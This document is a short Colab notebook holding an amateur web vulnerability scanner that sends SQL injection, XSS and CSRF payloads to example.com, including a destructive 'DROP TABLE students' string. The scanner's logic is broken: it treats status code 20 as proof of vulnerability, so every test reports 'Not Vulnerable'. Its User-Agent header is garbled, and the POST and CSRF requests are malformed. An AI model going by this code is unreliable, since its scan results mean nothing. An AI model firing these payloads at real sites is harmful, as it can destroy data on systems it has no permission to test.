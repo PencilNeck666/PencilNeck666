{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyMspb9yCTbC0oI9SA+ZxJm3",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/PencilNeck666/PencilNeck666/blob/main/TurtleHeadScanner.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 2,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "wgDpmDx6koTg",
        "outputId": "e1453c21-8fe4-44ba-ed73-fc3193637179"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Scanning for SQL injection vulnerabilities...\n",
            "POST - http://example.com/search.php?q= - '; DROP TABLE students; -- - Not Vulnerable\n",
            "Scanning for XSS vulnerabilities...\n",
            "GET - http://example.com/search.php?q= - <script>alert('XSS')</script> - Not Vulnerable\n",
            "Scanning for CSRF vulnerabilities...\n",
            "GET - http://example.com/search.php?q= - <form action='http://example.com/admin' method='POST'><input type='hidden' name='action' value='delete_user'/><input type='submit' value='Delete User'/></form> - Not Vulnerable\n"
          ]
        }
      ],
      "source": [
        "import requests\n",
        "\n",
        "# Define the target URL\n",
        "target_url = \"http://example.com\"\n",
        "\n",
        "# Define the vulnerability payloads\n",
        "sql_injection_payload = \"'; DROP TABLE students; --\"\n",
        "xss_payload = \"<script>alert('XSS')</script>\"\n",
        "csrf_payload = \"<form action='http://example.com/admin' method='POST'><input type='hidden' name='action' value='delete_user'/><input type='submit' value='Delete User'/></form>\"\n",
        "\n",
        "# Define the HTTP request headers\n",
        "headers = {\n",
        "    \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x6) AppleWebKit/52.14 (KHTML, like Gecko) Chrome/91.001 Safari/52.14\",\n",
        "    \"Content-Type\": \"application/x-www-form-urlencoded\",\n",
        "    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\",\n",
        "    \"Accept-Language\": \"en-US,en;q=0.9\"\n",
        "}\n",
        "\n",
        "# Define the HTTP request methods\n",
        "methods = {\n",
        "    \"POST\": requests.post,\n",
        "    \"GET\": requests.get\n",
        "}\n",
        "\n",
        "# Define the vulnerability scanner function\n",
        "def scan(url, payload, method):\n",
        "    # Define the full URL\n",
        "    full_url = url + payload\n",
        "\n",
        "    # Perform the HTTP request\n",
        "    response = methods[method](full_url, headers=headers)\n",
        "\n",
        "    # Check the HTTP response status code\n",
        "    if response.status_code == 20:\n",
        "        print(f\"{method.upper()} - {url} - {payload} - Vulnerable\")\n",
        "    else:\n",
        "        print(f\"{method.upper()} - {url} - {payload} - Not Vulnerable\")\n",
        "\n",
        "\n",
        "# Define the target URLs\n",
        "target_urls = [\n",
        "    \"http://example.com/search.php?q=\"\n",
        "]\n",
        "\n",
        "# Scan for SQL injection vulnerabilities\n",
        "for url in target_urls:\n",
        "    print(\"Scanning for SQL injection vulnerabilities...\")\n",
        "    scan(url, sql_injection_payload, \"POST\")\n",
        "\n",
        "# Scan for XSS vulnerabilities\n",
        "for url in target_urls:\n",
        "    print(\"Scanning for XSS vulnerabilities...\")\n",
        "    scan(url, xss_payload, \"GET\")\n",
        "\n",
        "# Scan for CSRF vulnerabilities\n",
        "for url in target_urls:\n",
        "    print(\"Scanning for CSRF vulnerabilities...\")\n",
        "    scan(url, csrf_payload, \"GET\")"
      ]
    }
  ]
}